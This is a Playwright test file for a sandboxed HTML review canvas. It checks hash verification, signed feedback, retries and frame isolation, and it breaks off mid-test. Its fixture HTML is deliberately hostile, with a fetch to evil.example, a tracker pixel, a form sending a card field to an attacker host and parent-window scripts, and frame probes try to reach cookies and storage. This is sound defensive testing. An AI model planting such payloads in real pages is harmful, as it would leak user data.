/**
 * Synaxis HTML Review Canvas E2E spec (mock bridge).
 *
 * Drives the real webview pipeline end to end: tagged kind-9 notification →
 * card → dedicated canvas → hash-verified document in the sandboxed frame →
 * keyboard block selection → one signed `synaxis.artifact-feedback` revision
 * plus one exact-thread wake message → disposition on the next revision.
 * Native verification (signature, envelope, hash) is covered by the Rust
 * tests; here the mock bridge stands in for the native commands.
 */
import { createHash, randomBytes } from "node:crypto";
import { expect, type Page, test } from "@playwright/test";
import { installMockBridge } from "../helpers/bridge";

type CommandLogEntry = { command: string; payload: Record<string, unknown> };
type MockEvent = {
  id: string;
  tags: string[][];
  content: string;
};

const GENERAL = "9a1657ac-f7aa-5db0-b632-d8bbeb6dfb50";
const ARTIFACT_ID = "04737c81-e5e8-4412-bb47-f446813cfeba";
const MOCK_PUBKEY = "deadbeef".repeat(8);
const AGENT = "c".repeat(64);
const PRIMARY = "checkout.primary-action";

const sha256 = (text: string) =>
  createHash("sha256").update(text).digest("hex");
const eventId = () => randomBytes(32).toString("hex");

/** Self-contained, three-block factory output laced with hostile content. */
const HOSTILE_REVIEW_HTML = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Checkout</title>
<style>body{font-family:sans-serif} header,section{padding:16px;margin:8px;border:1px solid #ccc}</style>
<script>window.parent.postMessage({artifactOwned:true},"*");</script>
</head><body onload="document.title='owned'">
<header data-synaxis-review-id="checkout.header" data-synaxis-review-title="Checkout header"><h1>Checkout</h1></header>
<section data-synaxis-review-id="${PRIMARY}" data-synaxis-review-title="Primary checkout action" data-synaxis-source-ref="src/features/checkout/CheckoutActions.tsx"><button type="button" onclick="fetch('https://evil.example/click')">Pay now</button></section>
<section data-synaxis-review-id="checkout.summary" data-synaxis-review-title="Order summary"><p>Two items</p><img src="https://evil.example/pixel.png" alt="tracker"><form action="https://evil.example/collect"><input name="card"></form></section>
</body></html>`;

const REVISION_TWO_HTML = HOSTILE_REVIEW_HTML.replace(
  "Two items",
  "Two items (summary moved up)",
);

async function readCommandLog(page: Page) {
  return page.evaluate(
    () =>
      (window as Window & { __BUZZ_E2E_COMMAND_LOG__?: CommandLogEntry[] })
        .__BUZZ_E2E_COMMAND_LOG__ ?? [],
  );
}

async function commandsNamed(page: Page, command: string) {
  return (await readCommandLog(page)).filter((e) => e.command === command);
}

async function signedFeedbackEvents(page: Page) {
  return page.evaluate(() =>
    (
      (
        window as Window & {
          __BUZZ_E2E_SIGNED_EVENTS__?: Array<{
            kind: number;
            content: string;
            tags: string[][];
          }>;
        }
      ).__BUZZ_E2E_SIGNED_EVENTS__ ?? []
    ).filter((event) => event.kind === 45010),
  );
}

async function invokeMockCommand<T = unknown>(
  page: Page,
  command: string,
  payload: Record<string, unknown>,
) {
  await page.waitForFunction(
    () =>
      typeof (window as Window & { __BUZZ_E2E_INVOKE_MOCK_COMMAND__?: unknown })
        .__BUZZ_E2E_INVOKE_MOCK_COMMAND__ === "function",
    null,
    { timeout: 5_000 },
  );
  return page.evaluate(
    async ({ command: name, payload: request }) =>
      (
        window as Window & {
          __BUZZ_E2E_INVOKE_MOCK_COMMAND__: (
            command: string,
            payload: Record<string, unknown>,
          ) => Promise<unknown>;
        }
      ).__BUZZ_E2E_INVOKE_MOCK_COMMAND__(name, request),
    { command, payload },
  ) as Promise<T>;
}

function reviewEvent(input: {
  originEventId: string;
  html: string;
  /** What the revision *declares*; defaults to the real hash of `html`. */
  declaredDigest?: string;
  revision?: number;
  id?: string;
  prev?: string;
  dispositions?: Array<{ feedback_revision_event_id: string; status: string }>;
}) {
  const digest = input.declaredDigest ?? sha256(input.html);
  const size = Buffer.byteLength(input.html);
  const revision = input.revision ?? 1;
  return {
    id: input.id ?? eventId(),
    pubkey: MOCK_PUBKEY,
    created_at: Math.floor(Date.now() / 1000) - 30 + revision,
    kind: 45010,
    tags: [
      ["ar", "1"],
      ["d", ARTIFACT_ID],
      ["h", GENERAL],
      ["type", "synaxis.html-review"],
      ["title", "Checkout review"],
      ["op", revision === 1 ? "create" : "update"],
      ["root", input.originEventId],
      ...(input.prev ? [["prev", input.prev]] : []),
      [
        "imeta",
        `url https://mock.relay/media/${digest}.html`,
        "m text/html",
        `x ${digest}`,
        `size ${size}`,
      ],
    ],
    content: JSON.stringify({
      schema: "synaxis.html-review/v1",
      work_item_id: "01WORKITEM",
      run_id: `01RUN${revision}`,
      revision,
      attribution: {
        requested_by: MOCK_PUBKEY,
        submitted_by: MOCK_PUBKEY,
        origin_event_id: input.originEventId,
      },
      artifact: {
        id: `01SYNAXIS${revision}`,
        kind: "feature-delivery/v3:HtmlReview",
        schema_version: 1,
        payload_digest: digest,
      },
      presentation: {
        mime_type: "text/html",
        blob_sha256: digest,
        byte_size: size,
      },
      feedback_dispositions: input.dispositions ?? [],
    }),
    sig: "mocksig".repeat(20).slice(0, 128),
  };
}

/** Seed an origin request, a published review revision, and its notification. */
async function seedReview(
  page: Page,
  options: {
    html?: string;
    declaredDigest?: string;
    served?: string;
    notificationDigest?: string;
  } = {},
) {
  const html = options.html ?? HOSTILE_REVIEW_HTML;
  const origin = await invokeMockCommand<{ event_id: string }>(
    page,
    "send_channel_message",
    { channelId: GENERAL, content: "Please build the checkout review" },
  );
  const revision = reviewEvent({
    originEventId: origin.event_id,
    html,
    declaredDigest: options.declaredDigest,
  });
  await invokeMockCommand(page, "e2e_publish_review_revision", {
    event: revision,
    html: options.served ?? html,
  });
  const digest = options.declaredDigest ?? sha256(html);
  const notification = await invokeMockCommand<{ event_id: string }>(
    page,
    "send_channel_message",
    {
      channelId: GENERAL,
      content: "The Checkout review is ready.",
      parentEventId: origin.event_id,
      mediaTags: [
        ["artifact", ARTIFACT_ID, revision.id],
        ["artifact_type", "synaxis.html-review"],
        ["agent", AGENT],
        ["x", options.notificationDigest ?? digest],
      ],
    },
  );
  return {
    originId: origin.event_id,
    revision,
    notificationId: notification.event_id,
  };
}

async function openReview(page: Page) {
  await page.getByTestId("channel-general").click();
  await page.getByRole("button", { name: /View thread with 1 reply/ }).click();
  const card = page.getByTestId("review-artifact-card");
  await expect(card).toBeVisible();
  await card.getByTestId("review-artifact-open").click();
  await expect(page.getByTestId("review-canvas")).toBeVisible();
}

const frameLocator = (page: Page) =>
  page.frameLocator('[data-testid="review-canvas-frame"]');
const block = (page: Page, id: string) =>
  frameLocator(page).locator(`[data-synaxis-review-id="${id}"]`);

async function waitForReadyFrame(page: Page) {
  await expect(page.getByTestId("review-canvas-frame")).toHaveAttribute(
    "data-status",
    "ready",
  );
}

test.beforeEach(async ({ page }) => {
  await installMockBridge(page);
  await page.goto("/");
});

test("keyboard review: tagged card → canvas → one signed feedback + one wake → disposition on revision 2", async ({
  page,
}) => {
  const requests: string[] = [];
  page.on("request", (request) => requests.push(request.url()));
  const dialogs: string[] = [];
  page.on("dialog", (dialog) => {
    dialogs.push(dialog.message());
    void dialog.dismiss();
  });

  const { originId, revision, notificationId } = await seedReview(page);
  await openReview(page);

  await expect(page.getByTestId("review-canvas-title")).toHaveText(
    "Checkout review",
  );
  await expect(page.getByTestId("review-canvas-revision")).toHaveText(
    "Revision 1",
  );
  await waitForReadyFrame(page);

  // Three declared blocks, in the frame and in the trusted chrome list.
  await expect(
    frameLocator(page).locator("[data-synaxis-review-id]"),
  ).toHaveCount(3);
  await expect(
    page.getByRole("list", { name: "Review blocks" }).getByRole("button"),
  ).toHaveCount(3);

  // Nothing the artifact tried reached the network, the parent, or the user.
  expect(requests.filter((url) => url.includes("evil.example"))).toEqual([]);
  expect(dialogs).toEqual([]);
  expect(await page.evaluate(() => document.title.includes("owned"))).toBe(
    false,
  );
  await expect(frameLocator(page).locator("script")).toHaveCount(1);
  await expect(frameLocator(page).locator("form, iframe, object")).toHaveCount(
    0,
  );

  // Escape cancels and returns focus to the block the reviewer came from.
  const primary = block(page, PRIMARY);
  await primary.focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await expect(form).toBeVisible();
  await expect(
    form.getByRole("heading", { name: "Comment on “Primary checkout action”" }),
  ).toBeVisible();
  await expect(form.getByLabel("Your comment")).toBeFocused();
  await page.keyboard.press("Escape");
  await expect(form).toBeHidden();
  await expect(primary).toBeFocused();

  // Space reopens it; submit with a double activation: still one send.
  await page.keyboard.press("Space");
  await expect(form).toBeVisible();
  await form
    .getByLabel("Your comment")
    .fill("Move this above the order summary.");
  await form.getByRole("button", { name: "Send feedback" }).dblclick();

  await expect(form).toBeHidden();
  await expect(page.getByTestId("review-announcer")).toContainText(
    "Feedback sent on Primary checkout action",
  );
  await expect(primary).toBeFocused();

  const signed = await signedFeedbackEvents(page);
  expect(signed).toHaveLength(1);
  const tags = new Map(signed[0].tags.map((tag) => [tag[0], tag[1]]));
  expect(tags.get("type")).toBe("synaxis.artifact-feedback");
  expect(tags.get("target")).toBe(PRIMARY);
  expect(tags.get("target_revision")).toBe(revision.id);
  expect(tags.get("payload")).toBe(sha256(HOSTILE_REVIEW_HTML));
  expect(tags.get("h")).toBe(GENERAL);
  expect(tags.get("root")).toBe(originId);
  const content = JSON.parse(signed[0].content);
  expect(content.reviewed.buzz_revision_event_id).toBe(revision.id);
  expect(content.target).toEqual({
    review_id: PRIMARY,
    title: "Primary checkout action",
    source_ref: "src/features/checkout/CheckoutActions.tsx",
  });
  expect(content.request).toBe("Move this above the order summary.");
  expect(signed[0].content).not.toContain("<section");

  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(1);
  expect(wakes[0].payload).toMatchObject({
    channelId: GENERAL,
    parentEventId: notificationId,
    rootEventId: originId,
    executiveAgentPubkey: AGENT,
    reviewedArtifactId: ARTIFACT_ID,
    reviewedRevisionEventId: revision.id,
    feedbackArtifactId: tags.get("d"),
  });
  const feedbackEventId = wakes[0].payload.feedbackRevisionEventId as string;

  // The relay holds that exact feedback revision, attached to revision 1.
  const listing = await invokeMockCommand<{ events: MockEvent[] }>(
    page,
    "list_review_feedback",
    {
      channelId: GENERAL,
      targetRevisionIds: [revision.id],
      feedbackEventIds: [],
    },
  );
  expect(listing.events.map((event) => event.id)).toEqual([feedbackEventId]);
  const item = page.getByTestId("review-feedback-item");
  await expect(item).toHaveCount(1);
  await expect(item).toContainText("Move this above the order summary.");
  await expect(item).toContainText("Awaiting revision");
  await expect(page.getByTestId(`review-block-${PRIMARY}`)).toContainText(
    "1 comment",
  );

  // The factory returns revision 2 with a disposition for that feedback.
  const revisionTwo = reviewEvent({
    originEventId: originId,
    html: REVISION_TWO_HTML,
    revision: 2,
    prev: revision.id,
    dispositions: [
      { feedback_revision_event_id: feedbackEventId, status: "addressed" },
    ],
  });
  await invokeMockCommand(page, "e2e_publish_review_revision", {
    event: revisionTwo,
    html: REVISION_TWO_HTML,
  });
  await page
    .getByRole("button", { name: "Check for a newer revision" })
    .click();
  const stale = page.getByTestId("review-stale-banner");
  await expect(stale).toBeVisible();
  // Feedback never silently rebinds: the old revision accepts no new comment.
  await expect(page.getByTestId(`review-block-${PRIMARY}`)).toBeDisabled();

  await stale.getByRole("button", { name: "Open the latest revision" }).click();
  await expect(page.getByTestId("review-canvas-revision")).toHaveText(
    "Revision 2",
  );
  await waitForReadyFrame(page);
  await expect(frameLocator(page).locator("body")).toContainText(
    "summary moved up",
  );
  const resolved = page.getByTestId("review-feedback-item");
  await expect(resolved).toHaveCount(1);
  await expect(resolved).toContainText("Move this above the order summary.");
  await expect(resolved.locator("[data-disposition]")).toHaveAttribute(
    "data-disposition",
    "addressed",
  );
  await expect(resolved).toContainText("Addressed in revision 2");

  // Original channel and thread stay one click away.
  await page.getByTestId("review-canvas-back").click();
  await expect(page.getByTestId("review-artifact-card")).toBeVisible();
});

test("a failed feedback publish blocks the wake message and retries the same signed event", async ({
  page,
}) => {
  await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_publish", {
    message: "relay rejected the feedback revision",
  });

  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await form.getByLabel("Your comment").fill("Make this the primary action.");
  await form.getByRole("button", { name: "Send feedback" }).click();

  await expect(page.getByTestId("review-comment-error")).toContainText(
    "relay rejected the feedback revision",
  );
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(0);
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  // The signed payload is frozen: the comment cannot change under a retry.
  await expect(form.getByLabel("Your comment")).toHaveJSProperty(
    "readOnly",
    true,
  );

  // The activated Send button never lost keyboard focus while sending: it is
  // aria-disabled, not disabled, and is now the focused Retry.
  const retry = form.getByRole("button", { name: "Retry" });
  await expect(retry).toBeFocused();

  // Reopening the signed comment offers Retry, never a fresh send.
  await page.keyboard.press("Escape");
  await expect(form).toBeHidden();
  await expect(block(page, PRIMARY)).toBeFocused();
  await page.keyboard.press("Enter");
  await expect(form).toBeVisible();
  await expect(form.getByRole("button", { name: "Send feedback" })).toHaveCount(
    0,
  );
  await expect(retry).toBeVisible();
  await expect(form.getByLabel("Your comment")).toHaveJSProperty(
    "readOnly",
    true,
  );

  await retry.click();
  await expect(form).toBeHidden();
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(1);
});

test("a failed wake message retries without publishing the feedback twice", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "active community changed before the message was submitted",
  });

  await block(page, "checkout.summary").focus();
  await page.keyboard.press("Space");
  const form = page.getByTestId("review-comment-form");
  await form.getByLabel("Your comment").fill("Tighten the spacing.");
  await form.getByRole("button", { name: "Send feedback" }).click();
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "active community changed",
  );
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  const listing = await invokeMockCommand<{ events: MockEvent[] }>(
    page,
    "list_review_feedback",
    {
      channelId: GENERAL,
      targetRevisionIds: [revision.id],
      feedbackEventIds: [],
    },
  );
  expect(listing.events).toHaveLength(1);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(2);
});

test("bytes that do not match the signed hash are never rendered", async ({
  page,
}) => {
  const tampered = HOSTILE_REVIEW_HTML.replace("Pay now", "Pay NOW");
  await seedReview(page, { served: tampered });
  await openReview(page);
  await expect(page.getByTestId("review-canvas-message")).toContainText(
    /hash mismatch|SHA-256/,
  );
  await expect(page.getByTestId("review-canvas-frame")).toHaveCount(0);
});

test("a review that no longer matches its notification digest is refused", async ({
  page,
}) => {
  await seedReview(page, { notificationDigest: "9".repeat(64) });
  await openReview(page);
  await expect(page.getByTestId("review-canvas-message")).toContainText(
    "no longer matches its notification",
  );
  await expect(page.getByTestId("review-canvas-frame")).toHaveCount(0);
});

test("the frame boundary denies network, parent, storage, popups, and forms even to script it could run", async ({
  page,
}) => {
  await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  const frame = page
    .frames()
    .find(
      (candidate) =>
        candidate !== page.mainFrame() && candidate.url() === "about:srcdoc",
    );
  expect(frame).toBeTruthy();

  const probes = await frame?.evaluate(async () => {
    const attempt = async (fn: () => unknown) => {
      try {
        await fn();
        return "allowed";
      } catch (error) {
        return `blocked:${(error as Error).name}`;
      }
    };
    return {
      parentDocument: await attempt(() => window.parent.document.title),
      parentStorage: await attempt(() => window.parent.localStorage.length),
      topNavigation: await attempt(() => {
        const topWindow = window.top;
        if (topWindow) topWindow.location.href = "about:blank#owned";
      }),
      storage: await attempt(() => localStorage.length),
      cookie: await attempt(() => document.cookie),
      fetch: await attempt(() => fetch("/")),
      popup: window.open("about:blank") === null ? "blocked" : "allowed",
    };
  });
  expect(probes).toEqual({
    parentDocument: "blocked:SecurityError",
    parentStorage: "blocked:SecurityError",
    topNavigation: "blocked:SecurityError",
    storage: "blocked:SecurityError",
    cookie: "blocked:SecurityError",
    fetch: "blocked:TypeError",
    popup: "blocked",
  });
});

test("a generic HTML attachment stays a download-only file card", async ({
  page,
}) => {
  const sha = "b".repeat(64);
  await invokeMockCommand(page, "send_channel_message", {
    channelId: GENERAL,
    content: `[synaxis-review.html](https://mock.relay/media/${sha}.html)`,
    mediaTags: [
      [
        "imeta",
        `url https://mock.relay/media/${sha}.html`,
        "m text/html",
        `x ${sha}`,
        "size 2048",
        "filename synaxis-review.html",
      ],
    ],
  });
  await page.getByTestId("channel-general").click();
  const card = page.getByTestId("file-card");
  await expect(card).toBeVisible();
  await expect(page.getByTestId("review-artifact-card")).toHaveCount(0);
  await expect(page.locator("iframe")).toHaveCount(0);

  await card.click();
  await expect
    .poll(async () => (await commandsNamed(page, "download_file")).length)
    .toBe(1);
  expect(await commandsNamed(page, "fetch_review_document")).toHaveLength(0);
  await expect(page.getByTestId("review-canvas")).toHaveCount(0);
});

test("feedback on a head that advanced under the reviewer is refused before anything is signed or woken", async ({
  page,
}) => {
  const { originId, revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);

  // The factory publishes revision 2 while the canvas still shows revision 1
  // (the head poll has not fired yet): the cached UI state is stale.
  await invokeMockCommand(page, "e2e_publish_review_revision", {
    event: reviewEvent({
      originEventId: originId,
      html: REVISION_TWO_HTML,
      revision: 2,
      prev: revision.id,
    }),
    html: REVISION_TWO_HTML,
  });

  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await form
    .getByLabel("Your comment")
    .fill("Move this above the order summary.");
  await form.getByRole("button", { name: "Send feedback" }).click();

  await expect(page.getByTestId("review-comment-error")).toContainText(
    "A newer revision of this review exists",
  );
  expect(await signedFeedbackEvents(page)).toHaveLength(0);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(0);
});

test("a lost wake acknowledgement retries the identical wake, never a second one", async ({
  page,
}) => {
  await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_lose_next_review_notification_ack", {
    message: "relay unreachable: request timed out",
  });

  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await form.getByLabel("Your comment").fill("Make this the primary action.");
  await form.getByRole("button", { name: "Send feedback" }).click();
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();

  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(2);
  // Every input that feeds the wake's event ID, including its frozen
  // timestamp and captured scope, is identical across the two attempts.
  expect(wakes[1].payload).toEqual(wakes[0].payload);
  expect(typeof wakes[0].payload.createdAt).toBe("number");
  expect(wakes[0].payload.expectedRelayUrl).toBeTruthy();
  expect(wakes[0].payload.expectedSignerPubkey).toBeTruthy();
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
});

// ── Recovery of a signed comment is independent of the head ────────────────

/** The factory publishes revision 2; the reviewer's canvas notices it. */
async function advanceHeadAndRefresh(
  page: Page,
  originId: string,
  previousId: string,
) {
  await invokeMockCommand(page, "e2e_publish_review_revision", {
    event: reviewEvent({
      originEventId: originId,
      html: REVISION_TWO_HTML,
      revision: 2,
      prev: previousId,
    }),
    html: REVISION_TWO_HTML,
  });
  await page
    .getByRole("button", { name: "Check for a newer revision" })
    .click();
  await expect(page.getByTestId("review-stale-banner")).toBeVisible();
}

async function sendFirstComment(page: Page, text: string) {
  await block(page, PRIMARY).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  await form.getByLabel("Your comment").fill(text);
  await form.getByRole("button", { name: "Send feedback" }).click();
  return form;
}

async function storedFeedback(page: Page, revisionId: string) {
  const listing = await invokeMockCommand<{ events: MockEvent[] }>(
    page,
    "list_review_feedback",
    {
      channelId: GENERAL,
      targetRevisionIds: [revisionId],
      feedbackEventIds: [],
    },
  );
  return listing.events;
}

test("accepted feedback retries its identical wake after the head advanced", async ({
  page,
}) => {
  const { originId, revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "wake submission failed",
  });

  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "wake submission failed",
  );

  await advanceHeadAndRefresh(page, originId, revision.id);
  // New comments are paused on the stale head; the signed one is not.
  await expect(
    page.getByTestId("review-block-checkout.summary"),
  ).toBeDisabled();
  await expect(page.getByTestId("review-comment-blocked")).toHaveCount(0);
  const retry = form.getByRole("button", { name: "Retry" });
  await expect(retry).toBeEnabled();
  await retry.click();
  await expect(form).toBeHidden();

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(2);
  expect(wakes[1].payload).toEqual(wakes[0].payload);
});

test("accepted feedback retries its identical wake while the head cannot be read", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "wake submission failed",
  });

  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "wake submission failed",
  );

  await invokeMockCommand(page, "e2e_fail_review_head_reads", {
    message: "relay head unavailable",
  });
  await page
    .getByRole("button", { name: "Check for a newer revision" })
    .click();
  await expect(page.getByTestId("review-head-error")).toBeVisible({
    timeout: 15_000,
  });
  await expect(page.getByTestId("review-comment-blocked")).toHaveCount(0);
  const retry = form.getByRole("button", { name: "Retry" });
  await expect(retry).toBeEnabled();
  await retry.click();
  await expect(form).toBeHidden();

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(2);
  expect(wakes[1].payload).toEqual(wakes[0].payload);
});

test("accepted feedback whose wake failed survives leaving the review and finishes with the same wake", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_notification", {
    message: "wake submission failed",
  });
  await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "wake submission failed",
  );

  // Leave the review for its thread, then open the same review again.
  await page.getByTestId("review-canvas-back").click();
  const card = page.getByTestId("review-artifact-card");
  await expect(card).toBeVisible();
  await card.getByTestId("review-artifact-open").click();
  await expect(page.getByTestId("review-canvas")).toBeVisible();
  await waitForReadyFrame(page);

  // The relay lists the accepted comment, but it is not shown as delivered,
  // and the way back to its Retry is a keyboard-reachable button.
  await expect(page.getByTestId("review-feedback-pending")).toHaveText(
    "Agent not notified yet",
  );
  const pending = page.getByTestId("review-pending-delivery");
  await expect(pending).toBeVisible();
  await pending.getByRole("button", { name: /Finish feedback on/ }).focus();
  await page.keyboard.press("Enter");
  const form = page.getByTestId("review-comment-form");
  const comment = form.getByLabel("Your comment");
  await expect(comment).toHaveValue("Make this the primary action.");
  await expect(comment).toHaveJSProperty("readOnly", true);
  await expect(form.getByRole("button", { name: "Send feedback" })).toHaveCount(
    0,
  );

  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();
  await expect(page.getByTestId(`review-block-${PRIMARY}`)).toBeFocused();
  await expect(page.getByTestId("review-pending-delivery")).toHaveCount(0);
  await expect(page.getByTestId("review-feedback-pending")).toHaveCount(0);

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  const wakes = await commandsNamed(page, "send_artifact_feedback_message");
  expect(wakes).toHaveLength(2);
  expect(wakes[1].payload).toEqual(wakes[0].payload);
});

test("a lost feedback acknowledgement republishes the identical event after the head advanced", async ({
  page,
}) => {
  const { originId, revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_lose_next_review_publish_ack", {
    message: "relay unreachable: request timed out",
  });

  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(0);

  // The relay holds the feedback, but the head moved before Retry.
  await advanceHeadAndRefresh(page, originId, revision.id);
  const retry = form.getByRole("button", { name: "Retry" });
  await expect(retry).toBeEnabled();
  await retry.click();
  await expect(form).toBeHidden();

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(1);
});

test("a signed comment the relay never accepted is refused as stale on retry and sends no wake", async ({
  page,
}) => {
  const { originId, revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_fail_next_review_publish", {
    message: "relay rejected the feedback revision",
  });

  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "relay rejected the feedback revision",
  );
  // The failure carried no answer from the relay, so the signed comment may be
  // on it: nothing offers to discard it yet.
  await expect(form.getByRole("button", { name: "Discard" })).toHaveCount(0);

  await advanceHeadAndRefresh(page, originId, revision.id);
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "feedback target is not the current review revision",
  );
  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(0);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(0);

  // Discarding the refused draft returns to the ordinary rule: a new comment
  // on the stale head stays paused.
  const discard = form.getByRole("button", { name: "Discard" });
  await discard.focus();
  await page.keyboard.press("Enter");
  // The Discard button is gone; focus moved to the text it re-opened.
  await expect(form.getByLabel("Your comment")).toBeFocused();
  await expect(form.getByLabel("Your comment")).toHaveJSProperty(
    "readOnly",
    false,
  );
  await expect(page.getByTestId("review-comment-blocked")).toBeVisible();
  await expect(
    form.getByRole("button", { name: "Send feedback" }),
  ).toBeDisabled();
});

// ── An unconfirmed publish is never discardable ─────────────────────────────

async function wakeAttempts(page: Page) {
  return invokeMockCommand<{
    attempts: Array<{ createdAt: number; outcome: string }>;
    stored: number;
  }>(page, "e2e_list_review_wake_attempts", {});
}

/** The raw durable outbox, as the webview's local storage holds it. */
async function outboxEntries(page: Page) {
  return page.evaluate(() =>
    Object.keys(window.localStorage)
      .filter((key) => key.startsWith("buzz-review-outbox.v1:"))
      .map((key) => window.localStorage.getItem(key) ?? ""),
  );
}

async function reopenReview(page: Page) {
  const card = page.getByTestId("review-artifact-card");
  await expect(card).toBeVisible();
  await card.getByTestId("review-artifact-open").click();
  await expect(page.getByTestId("review-canvas")).toBeVisible();
  await waitForReadyFrame(page);
}

test("a lost feedback acknowledgement can never be discarded or replaced; Retry reads the exact event and wakes once", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_lose_next_review_publish_ack", {
    message: "relay unreachable: request timed out",
  });
  // The relay cannot be asked either, so the outcome stays unknown.
  await invokeMockCommand(page, "e2e_fail_review_reconcile", {
    message: "relay unreachable: request timed out",
  });

  const form = await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );
  // The relay stored it and the client cannot tell: nothing offers to throw
  // it away or to write another.
  await expect(form.getByRole("button", { name: "Discard" })).toHaveCount(0);
  await expect(form.getByLabel("Your comment")).toHaveJSProperty(
    "readOnly",
    true,
  );
  await expect(form.getByRole("button", { name: "Send feedback" })).toHaveCount(
    0,
  );

  // Out of the form it is listed as waiting, and still cannot be discarded.
  await form.getByRole("button", { name: "Cancel" }).click();
  const pending = page.getByTestId("review-pending-delivery");
  await expect(pending).toContainText("has not confirmed it");
  await pending.getByRole("button", { name: /Finish feedback on/ }).click();
  await expect(form.getByRole("button", { name: "Discard" })).toHaveCount(0);

  // The relay can be read again: Retry finds the exact event it stored.
  await invokeMockCommand(page, "e2e_fail_review_reconcile", { message: null });
  await form.getByRole("button", { name: "Retry" }).click();
  await expect(form).toBeHidden();

  expect(await signedFeedbackEvents(page)).toHaveLength(1);
  expect(await storedFeedback(page, revision.id)).toHaveLength(1);
  expect(
    await commandsNamed(page, "send_artifact_feedback_message"),
  ).toHaveLength(1);
  expect(
    (await commandsNamed(page, "reconcile_review_feedback_event")).length,
  ).toBeGreaterThan(0);
  expect(await outboxEntries(page)).toHaveLength(0);
});

test("quitting and restarting after a lost acknowledgement keeps the comment: waiting, never shown as delivered, finished once", async ({
  page,
}) => {
  const { revision } = await seedReview(page);
  await openReview(page);
  await waitForReadyFrame(page);
  await invokeMockCommand(page, "e2e_lose_next_review_publish_ack", {
    message: "relay unreachable: request timed out",
  });
  await invokeMockCommand(page, "e2e_fail_review_reconcile", {
    message: "relay unreachable: request timed out",
  });
  await sendFirstComment(page, "Make this the primary action.");
  await expect(page.getByTestId("review-comment-error")).toContainText(
    "timed out",
  );

  // The signed comment is already on disk, with no key material in it.
  const [saved] = await outboxEntries(page);
  expect(saved).toContain('"publish":"ambiguous"');
  expect(saved).toContain("Make this the primary action.");
  expect(saved).not.toMatch(/nsec|secret|private/i);

  // Leave, quit, and relaunch: every live handle is gone; the outbox is not.
  await page.getByTestId("review-canvas-back").click();
  await invokeMockCommand(page, "e2e_restart_review_client", {});
